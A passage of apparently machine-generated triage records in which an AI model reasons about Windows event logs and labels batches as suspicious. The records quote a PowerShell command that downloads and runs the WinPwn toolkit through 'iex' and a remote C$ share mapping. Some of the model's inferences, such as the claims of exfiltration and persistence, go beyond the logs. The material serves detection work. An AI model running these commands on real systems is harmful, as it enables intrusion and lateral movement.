Still, nothing too alarming here.\n\nBut then I see a PowerShell process with a command line that downloads a script from a GitHub URL.

For example, some of the image loads are for .NET framework DLLs, which are normal.

The user wants me to determine if this batch is interesting for investigation. So first, I need to go through each event and see what's happening.\n\nStarting with the first event: svchost.exe setting a registry value. That's normal, as svchost is a system process. Then sppsvc.exe creating a file in the System32\\spp\\store\\2.0\\cache directory. That seems legitimate too, as sppsvc is related to Windows activation. \n\nNext, there are several events involving powershell.exe. The first one is a process access, but that's common. Then there's a whoami.exe process, which is usually used to check user context, so that's probably benign. But then there's a powershell.exe command that creates a new PSDrive with the path \\\\Target\\\\C$. That looks suspicious because it's accessing a remote machine's C$ share, which is a hidden administrative share. That could be part of lateral movement in a network attack.\n\nFollowing that, there are multiple image loads from PowerShell, including .NET assemblies like mscoree.dll, clr.dll, etc. These are normal for PowerShell, but the presence of multiple image loads might indicate that PowerShell is being used to run scripts or load modules. However, the key point here is the command that maps the remote drive. \n\nThen, a file is created in the Temp directory with a .ps1 extension, which is a PowerShell script. The file is later deleted, which is common in attacks to avoid leaving evidence. The creation and deletion of temporary scripts could be part of an attack. \n\nAdditionally, there's a Pipe Created event, which might be used for inter-process communication, but without more context, it's hard to say. The other image loads include Defender's MpOAV.dll and MpClient.dll, which could be part of legitimate antivirus operations, but if combined with other suspicious activities, it might be a red flag.\n\nPutting it all together, the most suspicious event is the PowerShell command that maps the remote C$ share. This is a common technique in attacks to access remote systems. The creation and deletion of a temporary PowerShell script also points to possible malicious activity. Even though some events are normal, the combination of these specific actions raises a red flag. \n\nI need to check if there are other indicators. The user is using PowerShell extensively, which is a common tool for both legitimate and malicious purposes. However, the remote drive mapping and the temporary script suggest potential malicious intent. \n\nConfidence-wise, since there's a clear suspicious action (remote drive mapping) and the script creation\/deletion, I'd say this is interesting. The confidence is around 0.8 because while some events are normal, the combination here is indicative of an attack.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple PowerShell events include suspicious actions like creating a remote network drive (\\\\Target\\\\C$), creating and immediately deleting a temporary script file (__PSScriptPolicyTest_ppfs3is3.jnx.ps1), and loading .NET assemblies commonly associated with code execution.

{"file":"filtering\/gemma3_4b\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let me try to figure this out. The user provided a bunch of log entries, and I need to determine if they're interesting for investigation. So, first, I'll look through the events.\n\nMost of the entries are about PowerShell processes. The command lines involve downloading a script from a GitHub URL using the WebClient object. The URL is from a repository called WinPwn, which sounds suspicious. The command uses 'iex' which is Invoke-Expression, a common method for executing scripts in memory, which is often used in attacks to avoid leaving files on disk.\n\nThen there are a few entries where the command line is different: 'New-PSDrive' with a path pointing to \\\\Target\\\\C$. This seems like creating a PSDrive to access a remote machine's C$ share, which is typically a network share. That could be part of lateral movement in a network attack.\n\nLooking at the winlog task fields, most are 'Provider Lifecycle' or 'Engine Lifecycle'. Not sure if that's relevant, but the main thing is the process commands. The repetition of the same command line multiple times might indicate a pattern, maybe a persistent attack or a script that's being run multiple times.\n\nThe presence of both downloading a malicious script and mapping a network drive suggests possible malicious activity. The WinPwn.ps1 script from that repo might be known for malicious purposes. Also, the use of -noninteractive and -consoleoutput might be flags for silent execution or output handling.\n\nHowever, I should check if these are legitimate activities. Sometimes, legitimate scripts might use similar commands. But the combination of downloading from a suspicious repo, using Invoke-Expression, and mapping network drives points towards potential compromise. The fact that the same command is repeated multiple times could indicate automation or a script that's part of an attack chain.\n\nSo, putting it all together, these logs show activities that are commonly associated with attacks: downloading and executing remote scripts, accessing network shares. Unless there's context indicating these are part of a legitimate process, they seem suspicious and warrant further investigation.\n<\/think>\n\nThe provided log entries exhibit **highly suspicious activity** indicative of potential **malicious behavior**. Here's the breakdown:\n\n---\n\n### **1. Malicious PowerShell Script Execution**\n- **Command Example**:  \n  ```powershell\n  powershell.exe & {iex (new-object net.webclient).downloadstring(\"https:\/\/github.com\/...\/WinPwn.ps1\")}\n  ```\n- **Key Indicators**:\n  - **`iex` (Invoke-Expression)**: Executes a downloaded script in memory, a common technique to avoid leaving files on disk.\n  - **Downloaded Script**: `WinPwn.ps1` from a GitHub repository (likely a **malicious payload** or tool for exploitation).\n  - **Repetition**: The same command appears **10 times**, suggesting **automation**, persistence, or a **scripted attack**.\n\n---\n\n### **2. Network Share Access (Lateral Movement)**\n- **Command Example**:  \n  ```powershell\n  powershell.exe & {New-PSDrive -name g -psprovider filesystem -unidade_auxiliar \\\\Target\\\\C$}\n  ```\n- **Key Indicators**:\n  - **`New-PSDrive`**: Maps a network share (`\\\\Target\\\\C$`) to a local drive (`g:`), enabling **remote file access**.\n  - **`\\\\Target\\\\C$`**: A **Windows administrative share** (commonly used for lateral movement in attacks).\n  - **Repetition**: This command appears **8 times**, suggesting **persistent access** or **data exfiltration**.\n\n---\n\n### **3. Contextual Red Flags**\n- **`WinPwn.ps1`**: The script name and repository (if linked to known malicious activity) could be part of **exploitation frameworks** or **post-exploitation tools**.\n- **Lack of Legitimacy**: No clear justification for repeated script execution or network share mapping (e.g., no user interaction, no benign purpose).\n- **High Volume**: The same commands are repeated **18 times**, which is **unusual for legitimate workflows**.\n\n---\n\n### **Conclusion**\nThese logs strongly suggest **compromise** or **malicious activity**, including:\n- **Remote code execution** via PowerShell.\n- **Lateral movement** across the network.\n- **Persistence** through repeated commands.\n\n**Recommendation**: Investigate further by:\n- Analyzing the **WinPwn.ps1** script for malicious content.\n- Checking **network traffic** to and from `\\\\Target\\\\C$`.\n- Reviewing **user activity** and **permissions** related to the PowerShell commands.\n- Blocking or isolating the affected system if confirmed malicious.\n\n**Verdict**: **Highly suspicious** – warrant immediate investigation."}
{"file":"filtering\/gemma3_4b\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let me analyze this batch of events. All the entries have the same structure: process is \"None\", winlog has the task \"Execute a Remote Command\", and file is \"None\". Since there are 20 identical entries, this seems repetitive. \n\nFirst, I need to check if \"Execute a Remote Command\" is a suspicious activity. Well, executing remote commands can be part of legitimate processes, like remote administration tools. However, if it's happening repeatedly without any context, it might indicate something like a script or automated task.\n\nBut wait, all the processes and files are \"None\". That's unusual. Typically, when a command is executed, there should be a process involved. If the process is missing, maybe the event logging is incomplete or there's a configuration issue. Alternatively, it could be a sign that the system is being manipulated in a way that evades detection by not associating the command with a known process.\n\nHowever, since all events are the same and there's no variation, it might just be a log error or a test. But the repetition could also be part of an attack, like a brute-force attempt or repeated exploitation. However, without any other indicators like IP addresses, user accounts, or different command parameters, it's hard to confirm malicious intent.\n\nOn the other hand, if this is a normal operational activity, like a scheduled task that runs a remote command, then it's not suspicious. But the absence of process and file details makes it hard to verify. The key here is that the same event is logged multiple times, which might be normal or abnormal depending on context. Since the user hasn't provided any other events or context, I have to rely solely on these logs.\n\nConsidering the lack of process and file information, and the repetitive nature, it's a bit suspicious. But without more data, I can't be certain. The confidence level is moderate. Maybe it's a false positive, but it's worth investigating further to check for log integrity or other correlated events.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple identical events with 'Execute a Remote Command' task logged repeatedly without process or file context, suggesting potential automation or evasion techniques.\",\n  \"CONFIDENCE\": 0.65\n}"}
